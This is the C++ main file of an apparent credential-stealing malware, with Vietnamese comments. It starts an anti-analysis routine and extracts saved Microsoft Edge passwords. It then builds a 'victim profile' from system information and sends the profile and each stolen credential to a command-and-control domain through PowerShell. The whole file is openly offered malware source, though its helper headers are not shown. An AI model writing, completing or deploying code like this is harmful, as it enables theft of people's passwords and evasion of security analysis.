#include <iostream>
#include <vector>
#include <string>
#include <tuple>
#include "edge_stealer.h" 
#include "system_infor.h"
#include "utils.h"
#include "anti_analysis.h"
#include "exfiltration.h" 
#include "config.h"
using namespace std;

int main() {
    // Tạo 1 antianalyze để anti analysis
	//AntiAnalysis antiAnalysis; 
    AntiAnalysis antiAnalysis; 
    // Tạo đối tương EdgeStealer để đánh cắp dữ liệu từ Edge
    EdgeStealer edgeStealer;
    std::vector<std::tuple<std::string, std::string, std::string, std::string>> edge_data = edgeStealer.StealPasswords();

	// Tạo đối tượng SystemInfor để lấy thông tin hệ thống
    SystemInfor sysInfor;

	// Tạo buidl Json để lưu dữ liệu và sysinfor làm profile victim 
	std::string json_data = Utils::buildExfilVictimProfileMessage(sysInfor);
	// gửi json_data lên server 
	Exfiltration exfil;
	exfil.sendViaPowerShell(json_data, C2_DOMAIN);
	for (const auto& data : edge_data) {
        // Gửi từng dữ liệu đánh cắp lên server
        while (!edge_data.empty()) {
            auto data = edge_data.back();
            edge_data.pop_back();
            std::string cre_d_data = Utils::buildExfilDataMessage(data);
            exfil.sendViaPowerShell(cre_d_data, C2_DOMAIN);
        }
	}
	

    return 0;
}
